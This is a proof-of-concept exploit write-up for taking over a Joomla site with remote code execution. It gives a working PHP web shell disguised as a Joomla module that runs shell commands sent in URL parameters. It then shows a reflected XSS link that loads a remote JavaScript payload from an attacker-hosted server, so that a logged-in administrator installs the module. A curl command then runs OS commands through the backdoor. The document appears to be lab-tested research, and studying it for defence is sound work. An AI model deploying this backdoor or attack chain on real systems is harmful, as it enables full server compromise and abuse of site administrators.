# [RCE] Install Module

## Test Environment

### Web Browsers (20240224)

* [x] Mozilla Firefox Version 123.0 (64-bit)
* [x] Google Chrome Version 122.0.6261.70 (64-bit)
* [x] Microsoft Edge Version 122.0.2365.52 (64-bit)

## Exploitation Steps

1. [create backdoored CMS module] backdoor source code

    * **NOTE**: update/customize PHP backdoor in `mod_RCE_PoC.php`

    (`mod_RCE_PoC.xml`)

    ```
    <?xml version="1.0" encoding="utf-8"?>
    <extension type="module" version="3.8" client="site" method="upgrade">
    	<name>Joomla RCE PoC</name>
    	<creationDate>Feb 2024</creationDate>
    	<author>test</author>
    	<authorEmail>test@localhost</authorEmail>
    	<authorUrl>https://localhost</authorUrl>
    	<copyright>test</copyright>
    	<version>1.0</version>
    	<files>
    		<filename module="mod_RCE_PoC">mod_RCE_PoC.php</filename>
    		<filename>mod_RCE_PoC.xml</filename>
    	</files>
    </extension>
    ```

    (`mod_RCE_PoC.php`)

    ```
    <?php
    if (md5($_GET['pass']) === '098f6bcd4621d373cade4e832627b4f6') { echo passthru($_GET['cmd']); }
    ?>
    ```

2. [create backdoored CMS module] create Joomla module

    ```
    zip mod_RCE_PoC.zip mod_RCE_PoC.xml mod_RCE_PoC.php
    ```

3. [setup exploit] change payload variable values (`installModuleJoomla.js`)

    `exploitURL` - URL of Joomla module (containing backdoor) to be installed on target site

    `joomlaRoot` - path to Joomla installation on the target system (e.g. `"/path"`)

4. [setup exploit] setup web server (to serve the payload/module)

5. [social engineering attack] victim user (with administrative privileges) logs in

    http://192.168.5.19/administrator

6. [social engineering attack] victim user clicks link

    ```
    http://192.168.5.19/test/rxss.php?q=<script src=http://192.168.5.15/installModuleJoomla.js></script>
    ```

    * **NOTES**:
      * `192.168.5.19` - target Joomla site
      * `192.168.5.15` - web server hosting payload

7. [post exploit] execute OS command

    ```
    curl -s "http://192.168.5.19/modules/mod_rce_poc/mod_RCE_PoC.php?pass=test&cmd=id" | head -n 1
    ```

    * **NOTE**: module URL constructed based on values specified in installed module

8. [uninstall module] uninstall module via GUI

    *Joomla ➔ System ➔ [Manage] Extensions ➔ (sort by latest ID) ➔ (mark checkbox) Joomla RCE PoC ➔ Uninstall ➔ Yes*

## Screenshots

* **NOTE**: the screenshot covers steps 1 to 7 from the "Exploitation Steps" chapter

![Image](screenshots/Joomla_-_install_module_-_1-1.png)
